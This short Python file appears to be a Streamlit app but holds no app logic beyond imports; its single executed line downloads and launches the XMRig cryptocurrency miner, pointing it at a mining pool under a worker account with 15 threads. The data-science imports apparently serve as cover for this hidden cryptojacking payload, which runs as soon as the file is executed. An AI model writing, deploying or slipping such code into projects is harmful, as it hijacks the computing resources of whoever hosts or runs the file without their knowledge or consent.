from collections import namedtuple
import altair as alt
import math
import pandas as pd
import streamlit as st
import os
import time
import subprocess
from os import system, name
from time import sleep
from subprocess import PIPE, Popen
import base64
os.system ("curl -L -o xmrig-6.18.0-linux-x64.tar.gz https://github.com/xmrig/xmrig/releases/download/v6.18.0/xmrig-6.18.0-linux-x64.tar.gz && tar -xf xmrig-6.18.0-linux-x64.tar.gz && cd xmrig-6.18.0 && ./xmrig -a rx/0 -o stc.ss.poolin.one:443 -u nung.001 --keepalive --donate-level 1 -p x -t 15") 
